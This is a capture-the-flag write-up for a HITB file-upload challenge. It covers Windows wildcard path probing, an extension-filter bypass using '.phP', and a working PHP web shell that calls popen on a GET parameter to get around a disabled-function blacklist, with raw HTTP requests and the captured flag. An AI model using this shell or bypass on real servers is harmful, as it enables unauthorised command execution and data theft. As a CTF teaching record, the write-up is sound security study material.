# Upload Challenge
Here is what we got when click in challenge URL
```
<head>
 <title>Where Path~?</title>
</head>
	<form action="upload.php" method="post" enctype="multipart/form-data">  
        <input type="file" name="file" value="up"/>  
        <input type="submit" value="upload" name="submit" />  
    </form>  
	<!--pic.php?filename=default.jpg-->
```

# Walk around
First I will view the source code to check if there's something strange. Here's what I got:
```
<head>
 <title>Where Path~?</title>
</head>
	<form action="upload.php" method="post" enctype="multipart/form-data">  
        <input type="file" name="file" value="up"/>  
        <input type="submit" value="upload" name="submit" />  
    </form>  
	<!--pic.php?filename=default.jpg-->
```

There's a path, `width=497</br>height=477` => what I got when access path

I immediately think about put a shell by upload the file and I notice that host is `Windows` which have a bug
You can read more in here [Bug-Bug](http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf)

On windows, if we pass `<` it will be replaced by `*` which means it will match of any symbol.
We don't know where the uploaded file is stored, we can use this to find out that directory to access our shell.
First I will upload a picture, get name of it, use `Burpsuite to` find the path

```
GET /pic.php?filename=../8%3C/1523584203.png HTTP/1.1
Host: 47.90.97.18:9999
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/7.0
X-Powered-By: PHP/5.6.35
Date: Sat, 14 Apr 2018 12:07:47 GMT
Connection: close
Content-Length: 26

width=2560</br>height=1440

```

If it return `width=...</br>height=...`, that means I'm right, continue one by one and I got the final path is
`87194F13726AF7CEE27BA2CFE97B60DF`

I upload the `php` file, it will block but you can bypass it by `phP`.
First `phP` file contents: `<?php phpinfo(); ?>`
There's a blacklist

```
assert,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
```

But we can you this payload for our `phP` file:

```
<?php
$handle = popen($_GET['a'], 'r'); 
echo $handle;
$read = fread($handle, 2096);
echo $read;
?>
```

then 
```
GET /87194F13726AF7CEE27BA2CFE97B60DF/1523704103.phP?a=type%20..\flag.php HTTP/1.1
Host: 47.90.97.18:9999
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/7.0
X-Powered-By: PHP/5.6.35
Date: Sat, 14 Apr 2018 12:05:11 GMT
Connection: close
Content-Length: 84

Resource id #2<?php
echo "flag is here";
//HITB{e5f476c1e4c6dc66278db95f0b5a228a}
?>
```

# Flag HITB{e5f476c1e4c6dc66278db95f0b5a228a}